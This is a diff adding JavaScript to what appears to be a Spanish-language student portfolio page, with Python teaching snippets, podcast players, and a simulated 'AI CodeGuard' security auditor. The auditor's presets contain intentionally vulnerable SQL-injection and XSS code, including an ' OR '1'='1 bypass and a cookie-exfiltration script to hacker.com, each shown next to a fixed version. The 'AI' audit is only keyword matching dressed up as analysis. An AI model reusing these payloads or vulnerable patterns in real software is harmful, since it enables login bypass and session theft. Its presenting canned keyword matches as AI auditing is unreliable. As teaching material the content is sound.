@@ -1088,7 +1088,7 @@ function goToPitchSlide(idx) {
   renderPitchSlide(idx);
 }
 
-// Inicialización de componentes de Marketing al cargar el documento
+// Inicialización de componentes al cargar el documento
 document.addEventListener('DOMContentLoaded', () => {
   // Inicializar simulador de pauta si está en la página
   if (document.getElementById('sim-budget')) {
@@ -1099,5 +1099,300 @@ document.addEventListener('DOMContentLoaded', () => {
   if (document.getElementById('pitch-slide-title')) {
     renderPitchSlide(0);
   }
+
+  // Inicializar componentes de Ingeniería de Sistemas
+  initSistemasComponents();
 });
+
+/* ==========================================================================
+   INTERACTIVIDAD PARA INGENIERÍA DE SISTEMAS (EXAMEN FINAL)
+   ========================================================================== */
+
+// 1. Simulador de Algoritmos en la Infografía Interactiva
+const algoSnippets = {
+  var: {
+    code: `<span style="color:#94a3b8;"># 1. Definición de variables y tipos en Python (FESNA Software Core)</span>
+nombre_estudiante: <span style="color:#4ade80;">str</span> = <span style="color:#fbbf24;">"David Pulido"</span>
+semestre_actual: <span style="color:#4ade80;">int</span> = <span style="color:#f87171;">10</span>
+promedio_ponderado: <span style="color:#4ade80;">float</span> = <span style="color:#f87171;">4.85</span>
+titulado_tecnico: <span style="color:#4ade80;">bool</span> = <span style="color:#38bdf8;">True</span>
+lenguajes_dominados: <span style="color:#4ade80;">list</span> = [<span style="color:#fbbf24;">"Python"</span>, <span style="color:#fbbf24;">"JavaScript"</span>, <span style="color:#fbbf24;">"SQL"</span>]`,
+    exp: `<strong style="color:#86efac; display:block; margin-bottom:0.2rem;">💡 Concepto Clave:</strong>
+Las variables son espacios nombrados en memoria RAM que almacenan tipos de datos específicos (primitivos como enteros/booleanos o compuestos como listas y diccionarios), esenciales para el soporte aplicativo.`
+  },
+  cond: {
+    code: `<span style="color:#94a3b8;"># 2. Lógica Condicional y Reglas de Negocio (Toma de Decisiones)</span>
+def evaluar_acceso_laboratorio(es_estudiante_fesna: <span style="color:#4ade80;">bool</span>, tiene_carnet_digital: <span style="color:#4ade80;">bool</span>) -> <span style="color:#4ade80;">str</span>:
+    <span style="color:#38bdf8;">if</span> es_estudiante_fesna <span style="color:#38bdf8;">and</span> tiene_carnet_digital:
+        <span style="color:#38bdf8;">return</span> <span style="color:#4ade80;">"✅ Acceso concedido al Laboratorio de IA y Redes."</span>
+    <span style="color:#38bdf8;">elif</span> es_estudiante_fesna:
+        <span style="color:#38bdf8;">return</span> <span style="color:#fbbf24;">"⚠️ Presenta tu documento de identidad en recepción."</span>
+    <span style="color:#38bdf8;">else</span>:
+        <span style="color:#38bdf8;">return</span> <span style="color:#f87171;">"❌ Acceso restringido a personal no autorizado."</span>`,
+    exp: `<strong style="color:#86efac; display:block; margin-bottom:0.2rem;">💡 Concepto Clave:</strong>
+Las estructuras condicionales (if / elif / else) bifurcan el flujo de ejecución según expresiones booleanas compuestas (AND, OR, NOT), base de la lógica empresarial y de validación.`
+  },
+  loops: {
+    code: `<span style="color:#94a3b8;"># 3. Ciclos y Procesamiento de Colecciones (Automatización)</span>
+modulos_aprobados = [<span style="color:#fbbf24;">"Lógica"</span>, <span style="color:#fbbf24;">"Bases de Datos"</span>, <span style="color:#fbbf24;">"POO"</span>, <span style="color:#fbbf24;">"Testing"</span>]
+
+<span style="color:#94a3b8;"># Iteración con for loop y acumulación de créditos</span>
+creditos_totales = <span style="color:#f87171;">0</span>
+<span style="color:#38bdf8;">for</span> modulo <span style="color:#38bdf8;">in</span> modulos_aprobados:
+    creditos_totales += <span style="color:#f87171;">4</span>
+    <span style="color:#38bdf8;">print</span>(<span style="color:#fbbf24;">f"Módulo verificado: {modulo} (+4 créditos)"</span>)
+
+<span style="color:#38bdf8;">print</span>(<span style="color:#fbbf24;">f"Total créditos acumulados ciclo técnico: {creditos_totales}"</span>)`,
+    exp: `<strong style="color:#86efac; display:block; margin-bottom:0.2rem;">💡 Concepto Clave:</strong>
+Los bucles (for, while) permiten ejecutar algoritmos repetitivos sobre volúmenes masivos de registros sin duplicar código, cumpliendo el principio de programación limpia DRY.`
+  },
+  func: {
+    code: `<span style="color:#94a3b8;"># 4. Funciones Modulares y Complejidad Algorítmica Eficiente O(1)</span>
+cache_estudiantes: <span style="color:#4ade80;">dict</span> = {
+    <span style="color:#fbbf24;">"1013098"</span>: {<span style="color:#fbbf24;">"nombre"</span>: <span style="color:#fbbf24;">"David Pulido"</span>, <span style="color:#fbbf24;">"programa"</span>: <span style="color:#fbbf24;">"Ingeniería de Sistemas"</span>}
+}
+
+<span style="color:#38bdf8;">def</span> buscar_estudiante_hash(documento: <span style="color:#4ade80;">str</span>) -> <span style="color:#4ade80;">dict</span>:
+    <span style="color:#94a3b8;"># Búsqueda en tabla hash con tiempo constante O(1)</span>
+    <span style="color:#38bdf8;">return</span> cache_estudiantes.get(documento, {<span style="color:#fbbf24;">"error"</span>: <span style="color:#fbbf24;">"No encontrado"</span>})`,
+    exp: `<strong style="color:#86efac; display:block; margin-bottom:0.2rem;">💡 Concepto Clave:</strong>
+La encapsulación en funciones y el uso de estructuras indexadas (Hash Maps / Diccionarios) optimiza el tiempo de respuesta de O(n) a O(1), fundamental para arquitecturas de alto tráfico.`
+  }
+};
+
+function switchAlgoTab(tab) {
+  const data = algoSnippets[tab];
+  if (!data) return;
+
+  const codeEl = document.getElementById('algo-code-display');
+  const expEl = document.getElementById('algo-explanation');
+
+  if (codeEl) codeEl.innerHTML = data.code;
+  if (expEl) expEl.innerHTML = data.exp;
+
+  const buttons = document.querySelectorAll('.algo-tab-btn');
+  buttons.forEach(btn => {
+    btn.classList.toggle('active', btn.getAttribute('onclick').includes(tab));
+  });
+}
+
+// 2. FESNA AI CodeGuard: Proyecto de Solución Tecnológica con IA
+const securityPresets = {
+  sqli: {
+    code: `# VULNERABLE: Inyección SQL clásica en endpoint de login
+def autenticar_usuario(cursor, usuario_input, password_input):
+    # Concatenación directa de strings sin sanitizar
+    query = f"SELECT * FROM usuarios WHERE user = '{usuario_input}' AND pass = '{password_input}'"
+    cursor.execute(query) # Exploit: ' OR '1'='1
+    return cursor.fetchone()`,
+    badgeClass: "danger",
+    badgeText: "🚨 CRÍTICO • OWASP A03: Injection",
+    title: "Vulnerabilidad de Inyección SQL detectada (CWE-89)",
+    score: "28 / 100",
+    scoreColor: "#f87171",
+    desc: "El código concatena entradas directas del usuario en una sentencia SQL sin sanitización ni sentencias preparadas, permitiendo eludir la autenticación mediante payloads como <code style='color:#fbbf24;'>' OR '1'='1</code> o extraer toda la base de datos.",
+    refactored: `# Código Seguro con Consultas Parametrizadas (Prepared Statements)
+cursor.execute(
+    "SELECT id, nombre, rol, pass_hash FROM usuarios WHERE user = %s LIMIT 1",
+    (usuario_input,)
+)
+registro = cursor.fetchone()
+if registro and bcrypt.checkpw(password_input.encode(), registro['pass_hash'].encode()):
+    return {"autenticado": True, "usuario": registro['nombre']}`
+  },
+  xss: {
+    code: `// VULNERABLE: Cross-Site Scripting (XSS Reflejado en búsqueda)
+function renderizarResultados(busquedaUsuario) {
+    const contenedor = document.getElementById('catalogo');
+    // Inserción directa de HTML inseguro sin escapar
+    contenedor.innerHTML = "<h3>Resultados para: " + busquedaUsuario + "</h3>";
+    // Exploit: <script>fetch('https://hacker.com/steal?c=' + document.cookie)</script>
+}`,
+    badgeClass: "danger",
+    badgeText: "🚨 ALTO • OWASP A03: Injection (XSS)",
+    title: "Vulnerabilidad Cross-Site Scripting Reflejado (CWE-79)",
+    score: "35 / 100",
+    scoreColor: "#f87171",
+    desc: "El uso de <code style='color:#fbbf24;'>innerHTML</code> sin escapar caracteres HTML permite a atacantes inyectar scripts maliciosos en el navegador del usuario para secuestrar tokens de sesión o robar credenciales.",
+    refactored: `// Solución Segura con Creación de Nodos Seguros (textContent)
+function renderizarResultadosSeguro(busquedaUsuario) {
+    const contenedor = document.getElementById('catalogo');
+    contenedor.replaceChildren(); // Limpia nodos de forma segura
+    const heading = document.createElement('h3');
+    heading.textContent = "Resultados para: " + busquedaUsuario; // Escapa automáticamente
+    contenedor.appendChild(heading);
+}`
+  },
+  perf: {
+    code: `# INEFICIENTE: Algoritmo O(n^2) y Fuga de Memoria
+def encontrar_duplicados_lento(lista_grande):
+    duplicados = []
+    # Dos bucles anidados generan O(n^2) de complejidad temporal
+    for i in range(len(lista_grande)):
+        for j in range(len(lista_grande)):
+            if i != j and lista_grande[i] == lista_grande[j]:
+                duplicados.append(lista_grande[i])
+    return duplicados`,
+    badgeClass: "warning",
+    badgeText: "⚠️ ADVERTENCIA • Complejidad Temporal O(n²)",
+    title: "Cuello de Botella y Complejidad Algorítmica Ineficiente",
+    score: "52 / 100",
+    scoreColor: "#fbbf24",
+    desc: "El algoritmo utiliza dos ciclos anidados cuadráticos O(n²). Para una lista de 50.000 registros, requiere 2.500 millones de operaciones, saturando CPU y memoria del servidor.",
+    refactored: `# Solución Optimizada en Tiempo Lineal O(n) usando Hash Sets
+def encontrar_duplicados_optimo(lista_grande):
+    vistos = set()
+    duplicados = set()
+    for item in lista_grande:
+        if item in vistos:
+            duplicados.add(item)
+        else:
+            vistos.add(item)
+    return list(duplicados) # Ejecuta en O(n) y tiempo menor a 0.05 segundos`
+  },
+  secure: {
+    code: `# CÓDIGO SEGURO: Clean Architecture con Hashing bcrypt y Tipado Estricto
+import bcrypt
+
+def autenticar_usuario_seguro(cursor, usuario: str, password_raw: str) -> dict:
+    query = "SELECT id, nombre, pass_hash, rol FROM usuarios WHERE user = %s LIMIT 1"
+    cursor.execute(query, (usuario,))
+    usuario_db = cursor.fetchone()
+    
+    if usuario_db and bcrypt.checkpw(password_raw.encode(), usuario_db['pass_hash'].encode()):
+        return {"status": "ok", "user_id": usuario_db['id'], "rol": usuario_db['rol']}
+    return {"status": "error", "message": "Credenciales inválidas"}`,
+    badgeClass: "success",
+    badgeText: "✅ SEGURO • Arquitectura Limpia Verificada",
+    title: "Cumplimiento de Estándares OWASP Top 10 y Tipado Fuerte",
+    score: "98 / 100",
+    scoreColor: "#4ade80",
+    desc: "El código implementa consultas preparadas parametrizadas contra inyecciones SQL, hashing criptográfico de contraseñas con sal (bcrypt) y tipado estático, cumpliendo las mejores prácticas de ingeniería de software.",
+    refactored: `# ¡Excelente! El código cumple con las directrices de ciberseguridad defensiva de FESNA.
+# No requiere refactorizaciones de seguridad críticas.`
+  }
+};
+
+function loadSecurityPreset(presetKey) {
+  const p = securityPresets[presetKey];
+  if (!p) return;
+
+  const editor = document.getElementById('ai-code-editor');
+  if (editor) editor.value = p.code;
+
+  const buttons = document.querySelectorAll('.preset-chip-btn');
+  buttons.forEach(btn => {
+    btn.classList.toggle('active', btn.getAttribute('onclick').includes(presetKey));
+  });
+
+  // Mostrar mensaje de listo
+  const statusTag = document.getElementById('audit-status-tag');
+  if (statusTag) statusTag.textContent = "Estado: Código cargado. Presiona 'Ejecutar Auditoría con IA'.";
+}
+
+function runAiSecurityAudit() {
+  const editor = document.getElementById('ai-code-editor');
+  if (!editor) return;
+
+  const statusTag = document.getElementById('audit-status-tag');
+  if (statusTag) statusTag.innerHTML = "<span style='color:#38bdf8;'>⏳ Analizando AST, tokens y vectores de vulnerabilidad con IA...</span>";
+
+  setTimeout(() => {
+    const code = editor.value;
+    let selected = securityPresets.secure;
+
+    if (code.includes('SELECT * FROM') && (code.includes('f"') || code.includes("f'"))) {
+      selected = securityPresets.sqli;
+    } else if (code.includes('innerHTML') || code.includes('<script>')) {
+      selected = securityPresets.xss;
+    } else if (code.includes('for i in range') && code.includes('for j in range')) {
+      selected = securityPresets.perf;
+    } else if (!code.includes('%s') && !code.includes('bcrypt')) {
+      selected = securityPresets.sqli;
+    }
+
+    // Actualizar DOM
+    const badge = document.getElementById('vuln-badge');
+    const title = document.getElementById('vuln-title');
+    const score = document.getElementById('security-score');
+    const desc = document.getElementById('vuln-description');
+    const refact = document.getElementById('refactored-code');
+
+    if (badge) {
+      badge.className = `vuln-badge ${selected.badgeClass}`;
+      badge.textContent = selected.badgeText;
+    }
+    if (title) title.textContent = selected.title;
+    if (score) {
+      score.textContent = selected.score;
+      score.style.color = selected.scoreColor;
+    }
+    if (desc) desc.innerHTML = selected.desc;
+    if (refact) refact.textContent = selected.refactored;
+
+    if (statusTag) statusTag.innerHTML = "<span style='color:#4ade80;'>✅ Auditoría completada con éxito.</span>";
+  }, 600);
+}
+
+// 3. Reproductores de Audio para Podcasts de Sistemas
+function initSistemasAudioPlayers() {
+  // Podcast Técnico (Nivel 2)
+  const btnTgss = document.getElementById('play-podcast-tgss');
+  const audioTgss = document.getElementById('audio-podcast-tgss');
+  const barsTgss = document.getElementById('podcast-tgss-bars');
+
+  if (btnTgss && audioTgss) {
+    btnTgss.addEventListener('click', () => {
+      if (audioTgss.paused) {
+        audioTgss.play();
+        btnTgss.textContent = '⏸ Pausar Podcast Técnico';
+        if (barsTgss) barsTgss.classList.add('playing');
+      } else {
+        audioTgss.pause();
+        btnTgss.textContent = '▶ Reproducir Podcast Técnico';
+        if (barsTgss) barsTgss.classList.remove('playing');
+      }
+    });
+
+    audioTgss.addEventListener('ended', () => {
+      btnTgss.textContent = '▶ Reproducir Podcast Técnico';
+      if (barsTgss) barsTgss.classList.remove('playing');
+    });
+  }
+
+  // Podcast Prospectivo (Nivel 3)
+  const btnProsp = document.getElementById('play-podcast-prospectivo');
+  const audioProsp = document.getElementById('audio-podcast-prospectivo');
+  const barsProsp = document.getElementById('podcast-prospectivo-bars');
+
+  if (btnProsp && audioProsp) {
+    btnProsp.addEventListener('click', () => {
+      if (audioProsp.paused) {
+        audioProsp.play();
+        btnProsp.textContent = '⏸ Pausar Análisis Prospectivo';
+        if (barsProsp) barsProsp.classList.add('playing');
+      } else {
+        audioProsp.pause();
+        btnProsp.textContent = '▶ Escuchar Análisis Prospectivo';
+        if (barsProsp) barsProsp.classList.remove('playing');
+      }
+    });
+
+    audioProsp.addEventListener('ended', () => {
+      btnProsp.textContent = '▶ Escuchar Análisis Prospectivo';
+      if (barsProsp) barsProsp.classList.remove('playing');
+    });
+  }
+}
+
+function initSistemasComponents() {
+  // Cargar preset inicial de seguridad si existe el editor
+  if (document.getElementById('ai-code-editor')) {
+    loadSecurityPreset('sqli');
+  }
+
+  // Inicializar reproductores de audio
+  initSistemasAudioPlayers();
+}
+
 
